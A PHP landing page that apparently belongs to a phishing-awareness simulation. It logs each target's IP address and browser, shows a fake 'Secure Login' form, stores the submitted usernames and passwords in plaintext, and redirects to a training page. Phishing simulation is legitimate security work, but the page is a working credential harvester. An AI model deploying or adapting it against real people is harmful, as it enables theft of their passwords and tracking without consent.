<?php
require_once __DIR__ . '/includes/db.php';
$token = $_GET['token'] ?? '';
if (!$token) { http_response_code(400); echo 'Missing token'; exit; }
$stmt = $pdo->prepare('SELECT * FROM messages WHERE token = ? LIMIT 1');
$stmt->execute([$token]);
$msg = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$msg) { http_response_code(404); echo 'Invalid token'; exit; }
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $stmt = $pdo->prepare('INSERT INTO clicks (campaign_id,user,token,ip,user_agent,created_at) VALUES (?,?,?,?,?,NOW())');
    $stmt->execute([$msg['campaign_id'], $msg['target'], $token, $ip, $ua]);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $stmt = $pdo->prepare('INSERT INTO submissions (campaign_id,user,username,password,created_at) VALUES (?,?,?,?,NOW())');
    $stmt->execute([$msg['campaign_id'], $msg['target'], $username, $password]);
    $u = $pdo->prepare('UPDATE messages SET submitted_at = NOW() WHERE id = ?');
    $u->execute([$msg['id']]);
    header('Location: training.php'); exit;
}
?><!doctype html><html><head><meta charset="utf-8"><title>Login</title><link rel="stylesheet" href="assets/style.css"></head><body><div class="container"><h2>Secure Login</h2><form method="post"><input name="username" placeholder="Email or username" required style="width:100%"><br><br><input name="password" type="password" placeholder="Password" required style="width:100%"><br><br><button type="submit">Login</button></form></div></body></html>